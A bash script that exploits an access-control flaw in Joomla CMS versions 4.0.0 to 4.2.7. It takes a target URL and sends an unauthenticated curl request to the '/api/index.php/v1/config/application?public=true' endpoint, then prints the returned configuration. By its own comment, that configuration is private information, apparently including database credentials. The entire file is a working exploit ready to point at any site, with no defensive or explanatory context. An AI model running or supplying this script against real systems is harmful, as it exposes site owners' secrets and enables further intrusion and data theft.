#!/bin/bash

# Validation of the number of arguments
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <URL>"
    echo "Example: $0 http://example.com"
    exit 1
fi

# URL validation
if [[ ! "$1" =~ ^https?:// ]]; then
    echo "Invalid URL. It must start with http:// or https://"
    exit 1
fi

echo "Retrieving information from the URL: $1"

# Use curl to retrieve private information from Joomla CMS 4.0.0 to 4.2.7
response=$(curl -s "$1/api/index.php/v1/config/application?public=true")

# Error handling
if [[ $? -ne 0 ]]; then
    echo "Error while performing CURL request"
    exit 1
fi

# Display formatted JSON output using python
echo -e "\nRetrieved information:"
echo "$response" | python -m json.tool
